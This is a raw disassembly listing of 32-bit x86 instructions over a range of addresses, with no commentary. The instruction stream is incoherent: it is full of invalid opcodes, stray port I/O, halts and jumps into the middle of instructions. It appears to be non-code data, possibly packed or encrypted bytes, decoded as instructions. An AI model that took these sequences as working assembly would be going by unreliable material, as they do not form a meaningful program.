  422f15:	and    eax,DWORD PTR [esi+0x6e1ebfcd]
  422f1b:	scas   al,BYTE PTR es:[edi]
  422f1c:	mov    edi,0xced6649
  422f21:	retf   0xaec2
  422f24:	aam    0x2d
  422f26:	mov    al,0x6f
  422f28:	xchg   edx,eax
  422f29:	sar    BYTE PTR [edx-0x7c],0xe8
  422f2d:	sub    esp,DWORD PTR [eax]
  422f2f:	push   ss
  422f30:	stos   BYTE PTR es:[edi],al
  422f31:	xchg   BYTE PTR [edi-0x14],ah
  422f34:	dec    esp
  422f35:	(bad)  
  422f36:	imul   ecx,DWORD PTR ds:0xbe13a8c1,0x45
  422f3d:	cmp    DWORD PTR [eax+0x12],esp
  422f40:	aad    0x9f
  422f42:	inc    ebp
  422f43:	(bad)  
  422f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  422f51:	add    dh,BYTE PTR [ebx]
  422f53:	mov    edi,DWORD PTR [eax]
  422f55:	mov    ebx,0xb63bb3b8
  422f5a:	fsubp  st(3),st
  422f5c:	mov    bh,0x88
  422f5e:	inc    esp
  422f5f:	scas   eax,DWORD PTR es:[edi]
  422f60:	out    dx,al
  422f61:	in     eax,dx
  422f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f63:	add    DWORD PTR [eax],eax
  422f65:	lods   al,BYTE PTR ds:[esi]
  422f66:	add    eax,DWORD PTR [eax]
  422f68:	add    BYTE PTR [ebx+0x46],bl
  422f6b:	stos   DWORD PTR es:[edi],eax
  422f6c:	xor    al,0xdf
  422f6e:	rol    bh,cl
  422f70:	mov    edx,0x820c6bba
  422f75:	les    edx,FWORD PTR [ecx-0x1f]
  422f78:	dec    cl
  422f7a:	dec    edi
  422f7b:	add    eax,0x57cb9daf
  422f80:	es imul ebp,ecx,0xbf40f2b6
  422f87:	xor    eax,0xb983613
  422f8c:	inc    ebp
  422f8d:	sub    dh,BYTE PTR [eax-0x1da87d71]
  422f93:	cmp    eax,0x974f0608
  422f98:	xchg   esi,eax
  422f99:	std    
  422f9a:	or     ch,BYTE PTR [ebp-0x48]
  422f9d:	(bad)  
  422f9e:	mov    eax,ds:0x5b868af
  422fa3:	imul   edi,DWORD PTR [edi],0x1e
  422fa6:	stc    
  422fa7:	mov    ebp,0x3d197cb7
  422fac:	inc    ebp
  422fad:	sbb    BYTE PTR [edi-0x3f],ah
  422fb0:	push   esi
  422fb1:	cwde   
  422fb2:	push   ss
  422fb3:	das    
  422fb4:	jne    0x422f9d
  422fb6:	xchg   ebx,ebx
  422fb8:	data16 adc BYTE PTR [edi-0x7f3adf71],cl
  422fbf:	inc    DWORD PTR [ecx+0x5d]
  422fc2:	jae    0x423017
  422fc4:	and    al,0x65
  422fc6:	sbb    al,0x14
  422fc8:	enter  0x3995,0x48
  422fcc:	pop    ebx
  422fcd:	xchg   ecx,eax
  422fce:	and    DWORD PTR [ebx-0x7a3e1e5d],ebp
  422fd4:	les    edx,FWORD PTR [ebp+0x66]
  422fd7:	push   0xdca81dd2
  422fdc:	hlt    
  422fdd:	and    BYTE PTR [ecx-0x50290d0a],ah
  422fe3:	mov    bh,0x42
  422fe5:	lods   al,BYTE PTR ds:[esi]
  422fe6:	xor    BYTE PTR [ecx-0x66944082],0xc7
  422fed:	pop    ebx
  422fee:	and    DWORD PTR [eax+0x40b6ec40],ecx
  422ff4:	inc    DWORD PTR [ebx+0x34]
  422ff7:	xor    eax,0xfc172f89
  422ffc:	sbb    eax,0x349a1d31
  423001:	or     BYTE PTR [ecx],bl
  423003:	jmp    0xfe98:0x3d351696
  42300a:	leave  
  42300b:	adc    al,0x7f
  42300d:	jo     0x42305d
  42300f:	mov    ecx,0xb1815f64
  423014:	fs cmp esi,ebx
  423017:	xchg   BYTE PTR [edx-0x26],bl
  42301a:	or     BYTE PTR [ebx],ah
  42301c:	addr16 das 
  42301e:	mov    ah,0x18
  423020:	pop    ds
  423021:	mov    esi,edx
  423023:	mov    es,WORD PTR [edi]
  423025:	pop    edi
  423026:	mov    al,ds:0x39d3c033
  42302b:	mov    dl,0x88
  42302d:	add    al,0x27
  42302f:	mov    ds:0x13126b60,eax
  423034:	and    BYTE PTR [eax+0x7aae89df],al
  42303a:	mov    cl,0x9
  42303c:	xchg   ebp,eax
  42303d:	pop    esi
  42303e:	push   ebx
  42303f:	adc    ch,BYTE PTR [ebx-0x29]
  423042:	sbb    al,0x7a
  423044:	xor    BYTE PTR [ecx-0x7b],al
  423047:	mov    BYTE PTR [ecx+0x5c4787cd],bh
  42304d:	out    0xa7,eax
  42304f:	data16 jns 0x423001
  423052:	dec    ebp
  423053:	cmp    dh,BYTE PTR [edx-0xe]
  423056:	and    al,0xd4
  423058:	push   ecx
  423059:	and    BYTE PTR [ecx+0x72348682],al
  42305f:	data16 add al,al
  423062:	out    dx,eax
  423063:	cwde   
  423064:	mov    edx,0xdc92e55c
  423069:	push   ebp
  42306a:	popf   
  42306b:	push   esp
  42306c:	cmp    BYTE PTR [edx+0x2a],0xa1
  423070:	popf   
  423071:	push   0x27d14a88
  423076:	inc    esp
  423077:	xchg   ecx,eax
  423078:	out    0xad,al
  42307a:	hlt    
  42307b:	xlat   BYTE PTR ds:[ebx]
  42307c:	pop    esi
  42307d:	mov    ds:0xc9d68011,al
  423082:	and    DWORD PTR [ebp-0x51],esi
  423085:	jge    0x4230f3
  423087:	fsubr  QWORD PTR [eax+0xadeb7af]
  42308d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42308e:	mov    al,0xd5
  423090:	ret    
  423091:	add    ebp,edi
  423093:	aaa    
  423094:	ins    BYTE PTR es:[edi],dx
  423095:	push   esp
  423096:	sbb    BYTE PTR [edx+eiz*1],ch
  423099:	dec    esp
  42309a:	repz sub ah,BYTE PTR [edi+eiz*2]
  42309e:	inc    ebx
  42309f:	dec    ecx
  4230a0:	and    eax,0x79718fd3
  4230a5:	sbb    edi,eax
  4230a7:	jecxz  0x423121
  4230a9:	mov    eax,gs
  4230ab:	push   ss
  4230ac:	inc    ecx
  4230ad:	pop    eax
  4230ae:	adc    DWORD PTR [esp+eiz*2],esp
  4230b1:	repz push ds
  4230b3:	icebp  
  4230b4:	ret    
  4230b5:	mov    gs,edi
  4230b7:	jle    0x4230b1
  4230b9:	mov    esi,eax
  4230bb:	pushf  
  4230bc:	sub    bh,BYTE PTR [ebx+0x29]
  4230bf:	icebp  
  4230c0:	jno    0x423054
  4230c2:	mov    ebp,0x77897e08
  4230c7:	lds    ecx,FWORD PTR [esi]
  4230c9:	adc    al,0x86
  4230cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230cc:	push   es
  4230cd:	hlt    
  4230ce:	xchg   edi,eax
  4230cf:	xchg   esi,eax
  4230d0:	ins    BYTE PTR es:[edi],dx
  4230d1:	ins    DWORD PTR es:[edi],dx
  4230d2:	fidiv  WORD PTR [ecx+ebp*2+0x4e]
  4230d6:	xchg   ebp,eax
  4230d7:	retf   0x9073
  4230da:	mov    dh,0xb0
  4230dc:	xor    ebx,DWORD PTR [ebx+edx*1-0x77]
  4230e0:	jge    0x423104
  4230e2:	jl     0x4230e1
  4230e4:	jmp    0x42311c
  4230e6:	icebp  
  4230e7:	fstp   QWORD PTR [ebp+0xf]
  4230ea:	mov    bh,0x7d
  4230ec:	xchg   DWORD PTR [ebx+0x508527d4],edi
  4230f2:	push   ecx
  4230f3:	fcomp  QWORD PTR [edi]
  4230f5:	enter  0x6c28,0xf2
  4230f9:	int    0x97
  4230fb:	fwait
  4230fc:	mov    es,WORD PTR [esi]
  4230fe:	pop    ebp
  4230ff:	sahf   
  423100:	xchg   DWORD PTR [edx-0x5a],ebx
  423103:	xor    dh,bl
  423105:	mov    al,ds:0x9f3f3061
  42310a:	xchg   edi,eax
  42310b:	aam    0xe0
  42310d:	(bad)  
  42310e:	sub    eax,0xf9c1bb61
  423113:	jne    0x423177
  423115:	into   
  423116:	sub    cl,BYTE PTR [edx]
  423118:	jae    0x4230f3
  42311a:	loopne 0x42314b
  42311c:	cmp    dh,cl
  42311e:	clc    
  42311f:	adc    esp,DWORD PTR [ebx]
  423121:	mov    dh,0x9
  423123:	inc    ebx
  423124:	inc    esp
  423125:	jle    0x423103
  423127:	xchg   edx,eax
  423128:	imul   eax,DWORD PTR [eax-0x63],0xffffffe5
  42312c:	out    dx,eax
  42312d:	and    ebp,DWORD PTR [edi]
  42312f:	xor    DWORD PTR [edi],eax
  423131:	push   ecx
  423132:	(bad)
  423135:	inc    esi
  423136:	cmp    BYTE PTR [ebx+edx*2-0x76],dh
  42313a:	data16 lock cli 
  42313d:	test   al,0xd3
  42313f:	test   al,0x62
  423141:	push   esp
  423142:	rcl    al,0x69
  423145:	pop    edi
  423146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423147:	sbb    al,0x18
  423149:	popf   
  42314a:	dec    esp
  42314b:	jae    0x4231c3
  42314d:	aam    0xbb
  42314f:	enter  0x9717,0xb
  423153:	inc    ecx
  423154:	xor    eax,0xc37bc9aa
  423159:	or     bl,bh
  42315b:	xlat   BYTE PTR ds:[ebx]
  42315c:	fidiv  DWORD PTR [ecx+0x27]
  42315f:	jns    0x4230eb
  423161:	imul   ebp,DWORD PTR [ebx-0x33],0x79
  423165:	aaa    
  423166:	fs mov cl,0x2f
  423169:	pop    eax
  42316a:	(bad)  
  42316b:	bound  ebp,QWORD PTR [ebx-0x1d3e6d65]
  423171:	dec    esp
  423172:	mov    esi,0x49e142c2
  423177:	push   eax
  423178:	js     0x42313b
  42317a:	out    dx,eax
  42317b:	loopne 0x423101
  42317d:	je     0x42313b
  42317f:	shl    BYTE PTR [ebx+0x401f31b6],cl
  423185:	sbb    BYTE PTR [ebx+0x22025e9e],dl
  42318b:	ss fs inc esi
  42318e:	adc    ebx,DWORD PTR [ecx+0xc0f65fe]
  423194:	jp     0x4231d1
  423196:	cmp    BYTE PTR [edi+0x5f],bh
  423199:	icebp  
  42319a:	sub    eax,0x5f974719
  42319f:	jl     0x4231c2
  4231a1:	sbb    al,0xc7
  4231a3:	stc    
  4231a4:	(bad)  
  4231a6:	jecxz  0x4231c9
  4231a8:	fild   DWORD PTR [eax+0x29f02a6d]
  4231ae:	inc    edx
  4231af:	mov    bl,0xfd
  4231b1:	push   esp
  4231b2:	fwait
  4231b3:	js     0x423198
  4231b5:	sub    eax,edx
  4231b7:	xor    esp,DWORD PTR [ecx]
  4231b9:	or     al,0x4c
  4231bb:	cmp    al,BYTE PTR [ecx-0x7a]
  4231be:	xlat   BYTE PTR ds:[ebx]
  4231bf:	adc    al,0x11
  4231c1:	and    ecx,DWORD PTR [ebx-0x64e68a8a]
  4231c7:	sub    ecx,ecx
  4231c9:	jmp    0x42322e
  4231cb:	hlt    
  4231cc:	pop    ecx
  4231cd:	mov    edx,0xf40b156b
  4231d2:	sbb    DWORD PTR [edx+0x20],esi
  4231d5:	loope  0x42322e
  4231d7:	ficom  DWORD PTR [ecx]
  4231d9:	xlat   BYTE PTR ds:[ebx]
  4231da:	mov    eax,ds:0x39ed0c13
  4231df:	inc    edx
  4231e0:	jo     0x423248
  4231e2:	xchg   esp,eax
  4231e3:	aad    0xaf
  4231e5:	popa   
  4231e6:	hlt    
  4231e7:	fidivr WORD PTR [eax+0x11]
  4231ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231eb:	cmp    al,0x4a
  4231ed:	push   edi
  4231ee:	and    al,BYTE PTR [ecx-0x3fd34df4]
  4231f4:	jp     0x423215
  4231f6:	pop    eax
  4231f7:	sub    eax,0xe209d237
  4231fc:	pop    esp
  4231fd:	jmp    0x423270
  4231ff:	cmp    DWORD PTR [ebx-0x6b5e899d],esp
  423205:	data16 add BYTE PTR [edx-0x47],dl
  423209:	push   eax
  42320b:	data16 jb 0x42326b
  42320e:	js     0x423277
  423210:	out    0x21,eax
  423212:	icebp  
  423213:	add    al,BYTE PTR [edx+0x38]
  423216:	mov    dl,0x13
  423218:	ret    0x4c49
  42321b:	not    BYTE PTR [ebp-0x1608b195]
  423221:	pop    ebp
  423222:	clc    
  423223:	mov    eax,ds:0xc0e377b2
  423228:	xchg   ebx,eax
  423229:	jbe    0x4231cc
  42322b:	addr16 pushf 
  42322d:	cmp    edi,DWORD PTR [esi+edx*8-0x4f]
  423231:	and    al,0x1c
  423233:	dec    ebx
  423234:	and    ch,dh
  423236:	push   esi
  423237:	adc    ecx,DWORD PTR [ecx+0xe]
  42323a:	js     0x4231f2
  42323c:	add    eax,0xb2d60e9f
  423241:	mov    DWORD PTR [edx+0x87b746d],ebx
  423247:	shl    DWORD PTR [ecx-0x1255961b],cl
  42324d:	inc    edx
  42324e:	dec    ebx
  42324f:	sbb    eax,0x27d88759
  423254:	cs out dx,al
  423256:	lock mov ah,0x9
  423259:	cmp    ch,ch
  42325b:	hlt    
  42325c:	adc    bl,ch
  42325e:	das    
  42325f:	pop    ss
  423260:	pop    ds
  423261:	sbb    ah,BYTE PTR [eax-0x21]
  423264:	imul   eax,eax,0x8ef29458
  42326a:	fwait
  42326b:	sbb    dl,BYTE PTR [edi-0x732d3167]
  423271:	add    DWORD PTR [edx],esp
  423273:	sar    DWORD PTR [eax],1
  423275:	clc    
  423276:	push   esi
  423277:	mov    ah,0x13
  423279:	dec    ebx
  42327a:	(bad)  
  42327c:	in     al,dx
  42327d:	pop    ebx
  42327e:	in     al,dx
  42327f:	lods   al,BYTE PTR ds:[esi]
  423280:	outs   dx,DWORD PTR ds:[esi]
  423281:	mov    cl,0x7
  423283:	out    0xc2,al
  423285:	inc    edi
  423286:	rol    ebx,0xf5
  423289:	sub    BYTE PTR [ebp-0x455d25d1],al
  42328f:	adc    edi,edx
  423291:	pop    edx
  423292:	add    dh,BYTE PTR [edi]
  423294:	arpl   bx,si
  423296:	data16 xlat BYTE PTR ds:[ebx]
  423298:	adc    DWORD PTR [ebx-0x77df3b7e],esi
  42329e:	je     0x4232ab
  4232a0:	xchg   ecx,eax
  4232a1:	ins    BYTE PTR es:[edi],dx
  4232a2:	jbe    0x42322e
  4232a4:	jmp    0xe9ba:0x55fee8da
  4232ab:	shl    al,cl
  4232ad:	imul   esi,DWORD PTR [eax+0x6ee60ce2],0xffffffb8
  4232b4:	dec    ecx
  4232b5:	xchg   ebx,eax
  4232b6:	(bad)  
  4232b7:	repz test DWORD PTR [edi+0x45737000],esp
  4232be:	xor    BYTE PTR [edi],cl
  4232c0:	dec    esi
  4232c1:	mov    ah,0x2f
  4232c3:	xor    esi,eax
  4232c5:	jb     0x423312
  4232c7:	das    
  4232c8:	in     eax,dx
  4232c9:	in     eax,0xd2
  4232cb:	ret    0x1ab2
  4232ce:	add    ah,ch
  4232d0:	mov    ebx,0x778585b0
  4232d5:	(bad)
  4232d8:	mov    edx,ss
  4232da:	sbb    ecx,DWORD PTR [edx+ebp*8-0x38f4e474]
  4232e1:	push   esi
  4232e2:	jg     0x423284
  4232e4:	js     0x42327b
  4232e6:	adc    dh,BYTE PTR [eax-0x79acc756]
  4232ec:	(bad)  
  4232ed:	sub    al,0x87
  4232ef:	adc    eax,ecx
  4232f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232f2:	mov    esp,0x4ca9180e
  4232f7:	arpl   WORD PTR [edx+0x39],bp
  4232fa:	and    BYTE PTR [edi+0x1c],bl
  4232fd:	ret    
  4232fe:	cmp    esi,DWORD PTR [esi-0x55c12cd5]
  423304:	bound  ebp,QWORD PTR [edi]
  423306:	push   ds
  423307:	std    
  423308:	iret   
  423309:	push   edi
  42330a:	jbe    0x4232e5
  42330c:	int3   
  42330d:	out    0x1b,al
  42330f:	xchg   ecx,eax
  423310:	adc    eax,0x51bb83bf
	...
  423321:	cli    
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0x2e
  42332e:	mov    ebx,0xab994621
  423333:	add    DWORD PTR [eax],eax
  423335:	lods   al,BYTE PTR ds:[esi]
  423336:	add    eax,DWORD PTR [eax]
  423338:	add    BYTE PTR [ebx-0x2f],bh
  42333b:	scas   eax,DWORD PTR es:[edi]
  42333c:	dec    esp
  42333d:	jl     0x423339
  42333f:	aas    
  423340:	dec    ebx
  423341:	sbb    dh,al
  423343:	and    cl,BYTE PTR [ecx+0x37a02ce4]
  423349:	gs aas 
  42334b:	dec    eax
  42334c:	and    ecx,DWORD PTR [ebx+0x5087557a]
  423352:	addr16 and bh,cl
  423355:	mov    WORD PTR [eax],gs
  423357:	xchg   edx,eax
  423358:	inc    edx
  423359:	lods   eax,DWORD PTR ds:[esi]
  42335a:	mov    ebp,0x5f474e30
  42335f:	jo     0x423323
  423361:	loopne 0x423318
  423363:	xor    DWORD PTR [edx],ebx
  423365:	shl    BYTE PTR [edx+0x55],cl
  423368:	jge    0x4233d0
  42336a:	sbb    eax,0x825e7427
  42336f:	outs   dx,BYTE PTR ds:[esi]
  423370:	ss inc ebx
  423372:	mov    esi,ebp
  423374:	imul   esp,edi,0x519e21f6
  42337a:	mov    cl,ah
  42337c:	mov    bh,0x34
  42337e:	inc    esi
  42337f:	pop    ss
  423380:	les    esp,FWORD PTR [ebx]
  423382:	sbb    ebp,esp
  423384:	xchg   esi,eax
  423385:	mov    edi,0xa98d2589
  42338a:	not    bh
  42338c:	jmp    DWORD PTR [ebx]
  42338e:	cmp    al,0x98
  423390:	xchg   esp,eax
  423391:	mov    BYTE PTR [edi+0x7f2cd8f],dl
  423397:	xchg   ebp,eax
  423398:	and    BYTE PTR [esi*2+0x6b0cc942],bh
  42339f:	fstp   DWORD PTR [ebp+0x36e43b74]
  4233a5:	push   0xdd24db3d
  4233aa:	xor    eax,0xe2ce1a00
  4233af:	mov    dh,0xfb
  4233b1:	ret    
  4233b2:	jmp    DWORD PTR [si+0x2b00]
  4233b7:	sbb    eax,0x217c76e8
  4233bc:	sub    eax,0xc304334c
  4233c1:	push   ds
  4233c2:	lods   al,BYTE PTR ds:[esi]
  4233c3:	jecxz  0x42338a
  4233c5:	in     eax,0x91
  4233c7:	sahf   
  4233c8:	lds    esi,FWORD PTR [esi-0x2863ad67]
  4233ce:	std    
  4233cf:	sahf   
  4233d0:	fiadd  DWORD PTR [eax+0x652a4df5]
  4233d6:	sahf   
  4233d7:	es pop esp
  4233d9:	inc    ecx
  4233da:	(bad)  
  4233db:	aam    0xff
  4233dd:	mov    cl,0x37
  4233df:	jno    0x423372
  4233e1:	xchg   edx,eax
  4233e2:	in     al,dx
  4233e3:	ja     0x4233ca
  4233e5:	mov    al,0xd6
  4233e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233e8:	mov    esp,0xd582020c
  4233ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233ee:	or     bh,al
  4233f0:	enter  0xcebb,0xbe
  4233f4:	add    al,0x8f
  4233f6:	push   ss
  4233f7:	pusha  
  4233f8:	push   ebx
  4233f9:	fs pop edi
  4233fb:	dec    ebx
  4233fc:	cdq    
  4233fd:	jae    0x42338b
  4233ff:	dec    ebp
  423400:	ins    DWORD PTR es:[edi],dx
  423401:	data16 out dx,al
  423403:	pop    ds
  423404:	xchg   edi,eax
  423405:	fs aaa 
  423407:	je     0x42346b
  423409:	inc    ebp
  42340a:	xor    BYTE PTR [esi-0x6],dl
  42340d:	cwde   
  42340e:	push   ds
  42340f:	lds    ebp,FWORD PTR es:[ebx]
  423412:	mov    esi,0x4624882b
  423417:	lahf   
  423418:	pushf  
  423419:	fisttp QWORD PTR [ebx]
  42341b:	out    0x66,eax
  42341d:	shl    BYTE PTR [edi],cl
  42341f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423420:	push   esi
  423421:	leave  
  423422:	mov    esp,0xe39dda61
  423427:	xchg   edx,eax
  423428:	std    
  423429:	pushw  ss
  42342b:	sub    DWORD PTR [ecx],0x9
  42342e:	or     eax,0x170ab8d9
  423433:	or     ebx,DWORD PTR [ebx-0x560de26d]
  423439:	bound  esi,QWORD PTR [edi]
  42343b:	aam    0xdd
  42343d:	in     eax,0x7c
  42343f:	inc    eax
  423440:	(bad)  
  423441:	and    eax,0xf61299a1
  423446:	xchg   edi,eax
  423447:	mov    WORD PTR [ebx-0x6da6b6e4],?
  42344d:	pop    ebx
  42344e:	adc    eax,0x94e626f7
  423453:	in     al,0x58
  423455:	adc    al,0x11
  423457:	lock push es
  423459:	xchg   esi,eax
  42345a:	or     eax,0x47c5b585
  42345f:	add    BYTE PTR [eax+0x67],dl
  423462:	or     DWORD PTR ds:0xf51ce12d,eax
  423468:	daa    
  423469:	clc    
  42346a:	push   esi
  42346b:	cmp    bl,al
  42346d:	jl     0x4234ab
  42346f:	jecxz  0x4233fb
  423471:	mov    edi,0x3a077c1d
  423476:	jecxz  0x423425
  423478:	das    
  423479:	jae    0x4234d7
  42347b:	std    
  42347c:	sbb    al,0x3e
  42347e:	ror    DWORD PTR [ecx+eiz*8+0x42],1
  423482:	push   es
  423483:	scas   eax,DWORD PTR es:[edi]
  423484:	mov    esp,0xb8484a6d
  423489:	mov    al,ds:0xcb47cb88
  42348e:	and    al,BYTE PTR [ebx-0x2e]
  423491:	jnp    0x42342b
  423493:	sar    BYTE PTR [eax+0x6f],cl
  423496:	mov    cl,0x23
  423498:	sbb    al,0x4c
  42349a:	push   0x77
  42349c:	mov    DWORD PTR [esi-0x66],ecx
  42349f:	imul   esp,DWORD PTR ds:0x25e8f69b,0x71
  4234a6:	sbb    BYTE PTR [edx+0x65],cl
  4234a9:	je     0x42348e
  4234ab:	cmp    al,0x2a
  4234ad:	and    al,0x3f
  4234af:	xor    al,0xee
  4234b1:	mov    cl,0xc6
  4234b3:	cs dec edi
  4234b5:	ins    DWORD PTR es:[edi],dx
  4234b6:	fld    TBYTE PTR [ebx]
  4234b8:	test   BYTE PTR [edi+esi*1+0x337e4524],0x7b
  4234c0:	hlt    
  4234c1:	mov    ds:0x9bb2d945,al
  4234c6:	imul   edi,DWORD PTR [edx+0x6459046],0x22f00faf
  4234d0:	aas    
  4234d1:	cmp    BYTE PTR [ebp-0x20],ah
  4234d4:	xchg   ecx,eax
  4234d5:	shl    BYTE PTR [esi-0x67],cl
  4234d8:	sahf   
  4234d9:	xchg   ecx,eax
  4234da:	fidivr WORD PTR [esi]
  4234dc:	xchg   esp,eax
  4234dd:	push   es
  4234de:	mov    cl,0x5c
  4234e0:	cwde   
  4234e1:	int    0x75
  4234e3:	dec    edi
  4234e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234e5:	cmc    
  4234e6:	dec    ecx
  4234e7:	ja     0x4234e9
  4234e9:	ret    
  4234ea:	push   ebp
  4234eb:	mov    dh,0x47
  4234ed:	sub    ecx,esi
  4234ef:	rcr    BYTE PTR [ebp-0x3a],1
  4234f2:	es inc ebx
  4234f4:	inc    ecx
  4234f5:	mov    ebx,0x554a57ed
  4234fa:	mov    esi,0x3d867102
  4234ff:	inc    edi
  423500:	mov    esi,0xaabe50c8
  423505:	shl    BYTE PTR [esi+edx*4+0x2d],0x67
  42350a:	aas    
  42350b:	pusha  
  42350c:	aam    0x21
  42350e:	lods   eax,DWORD PTR fs:[esi]
  423510:	dec    eax
  423511:	cmp    cl,BYTE PTR [ebx]
  423513:	mov    esi,0xa435684a
  423518:	test   BYTE PTR [ebx-0x51],ah
  42351b:	(bad)  
  42351c:	mul    DWORD PTR [ebp+0x4f]
  42351f:	pop    ebx
  423520:	and    bh,bl
  423522:	sub    DWORD PTR [eax-0x556316cd],edx
  423528:	jp     0x423518
  42352a:	pop    esp
  42352b:	add    eax,0x6418e2d5
  423530:	push   0xfffffff5
  423532:	sub    BYTE PTR [esi-0x1168ddc0],ch
  423538:	hlt    
  423539:	add    al,0x99
  42353b:	mov    eax,0xd9e343f1
  423540:	je     0x423526
  423542:	cmp    BYTE PTR [edi],0x3b
  423545:	iret   
  423546:	add    eax,0x3c95a358
  42354b:	jbe    0x423561
  42354d:	xor    DWORD PTR [eax],esi
  42354f:	fs (bad) 
  423551:	cmp    eax,0x1948f6ae
  423556:	pop    ecx
  423557:	fwait
  423558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42355a:	xor    al,0x5a
  42355c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42355d:	mov    BYTE PTR [ebx-0x4],ch
  423560:	mov    WORD PTR [ebx+0x65],ss
  423563:	out    0xe8,al
  423565:	and    ecx,esp
  423567:	sub    dh,0x4c
  42356a:	in     al,dx
  42356b:	jp     0x42351b
  42356d:	lock mov DWORD PTR [ecx],0xfe976f36
  423574:	mov    al,ds:0x67a15c7f
  423579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42357a:	jno    0x423579
  42357c:	fwait
  42357d:	andnps xmm7,XMMWORD PTR [edi+0x734c13e]
  423584:	idiv   DWORD PTR [edi]
  423586:	adc    bl,ch
  423588:	inc    ebx
  423589:	add    DWORD PTR [edi+0x7],eax
  42358c:	dec    ecx
  42358d:	outs   dx,DWORD PTR ds:[esi]
  42358e:	cli    
  42358f:	mov    BYTE PTR [ecx+0x76],bl
  423592:	imul   ecx,DWORD PTR [eax+0x10],0x614a7fd1
  423599:	into   
  42359a:	cld    
  42359b:	cdq    
  42359c:	mul    ebx
  42359e:	(bad)  
  42359f:	je     0x42354c
  4235a1:	jns    0x4235f1
  4235a3:	dec    ebx
  4235a4:	out    0xaa,eax
  4235a6:	jle    0x4235b2
  4235a8:	js     0x423625
  4235aa:	inc    ecx
  4235ab:	push   ss
  4235ac:	xlat   BYTE PTR ds:[ebx]
  4235ad:	mov    ds:0xb6e9b5e7,eax
  4235b2:	mov    ebx,0x1e96dd70
  4235b7:	addr16 mov ebp,0x59bd7065
  4235bd:	sbb    DWORD PTR [eax],eax
  4235bf:	xor    ebp,0x859b548
  4235c5:	add    eax,0xcb724bc7
  4235ca:	call   0x119f:0x3cda25d7
  4235d1:	fcom   st(4)
  4235d3:	push   0x8929d4c2
  4235d8:	adc    eax,0x802de176
  4235dd:	fsincos 
  4235df:	bound  edx,QWORD PTR [ecx+0x32]
  4235e2:	pop    edi
  4235e3:	xchg   ecx,eax
  4235e4:	push   ebp
  4235e5:	dec    ebp
  4235e6:	clc    
  4235e7:	or     ah,BYTE PTR [esi+0x39]
  4235ea:	push   es
  4235eb:	cli    
  4235ec:	add    dh,BYTE PTR [esi+0x1d]
  4235ef:	cmp    DWORD PTR [ebx-0x3c4b8f83],ebx
  4235f5:	sub    dl,BYTE PTR ss:[ebx+ecx*1-0x17cfa3c8]
  4235fd:	mov    DWORD PTR [ebx+0x72d64a5a],0xceec64b2
  423607:	rcr    BYTE PTR [eax+esi*8],1
  42360a:	repnz xchg esi,eax
  42360c:	cmp    al,0x5a
  42360e:	xchg   ebp,eax
  42360f:	lods   eax,DWORD PTR ds:[esi]
  423610:	and    bl,BYTE PTR [ebp-0x7187c545]
  423616:	lahf   
  423617:	stos   BYTE PTR es:[edi],al
  423618:	jle    0x4235ea
  42361a:	ror    DWORD PTR ds:0x3a45d5fd,cl
  423620:	clc    
  423621:	retf   
  423622:	sets   BYTE PTR [edi-0x7a]
  423626:	(bad)  
  423627:	out    dx,al
  423628:	call   0x4819:0x7f4b6b4e
  42362f:	mov    BYTE PTR [esp+edi*2-0x40cb4619],al
  423636:	cmp    eax,esi
  423638:	xor    eax,0x8465de46
  42363d:	xor    ecx,DWORD PTR [esi]
  42363f:	retf   0x67fd
  423642:	adc    esp,ebp
  423644:	add    al,BYTE PTR [ebx+esi*8-0x16]
  423648:	mov    al,0x7d
  42364a:	xor    al,0x8e
  42364c:	repz popf 
  42364e:	sub    al,0x68
  423650:	repz dec edx
  423652:	jle    0x42365a
  423654:	shr    BYTE PTR [ecx+edi*8],0x9a
  423658:	repz fcomp DWORD PTR [edi-0x5e]
  42365c:	jb     0x423687
  42365e:	xor    eax,edi
  423660:	adc    al,0x26
  423662:	aad    0xa7
  423664:	jnp    0x42363c
  423666:	jp     0x4235e9
  423668:	bound  esp,QWORD PTR [edx-0x49eb3790]
  42366e:	pop    ecx
  42366f:	and    bh,bl
  423671:	sti    
  423672:	in     eax,0xb5
  423674:	cld    
  423675:	mov    DWORD PTR [esi-0x175c42e2],esi
  42367b:	neg    eax
  42367d:	jne    0x423672
  42367f:	push   esi
  423680:	push   esi
  423681:	(bad)  
  423682:	aam    0x96
  423684:	cmp    ebp,eax
  423686:	sub    ch,BYTE PTR [ebx]
  423688:	jb     0x42367b
  42368a:	mov    edi,0x16374b1f
  42368f:	outs   dx,DWORD PTR ds:[esi]
  423690:	or     bh,cl
  423692:	cmp    BYTE PTR [ebx-0x78],dl
  423695:	sar    BYTE PTR [edi-0x30],1
  423698:	cs cld 
  42369a:	scas   eax,DWORD PTR es:[edi]
  42369b:	jmp    0x78da3872
  4236a0:	test   eax,0xcae96028
  4236a5:	fistp  WORD PTR [ebp-0x7f87cf1b]
  4236ab:	jp     0x423662
  4236ad:	popf   
  4236ae:	fst    QWORD PTR [ebp-0x50]
  4236b1:	in     eax,dx
  4236b2:	push   es
  4236b3:	aam    0x2e
  4236b5:	outs   dx,DWORD PTR ds:[esi]
  4236b6:	cdq    
  4236b7:	(bad)
  4236ba:	sub    eax,DWORD PTR [edx-0x51e89963]
  4236c0:	ins    DWORD PTR es:[edi],dx
  4236c1:	xchg   dl,ah
  4236c3:	mov    al,0x4a
  4236c5:	outs   dx,BYTE PTR ds:[esi]
  4236c6:	call   0x8bb0e3fc
  4236cb:	cdq    
  4236cc:	push   eax
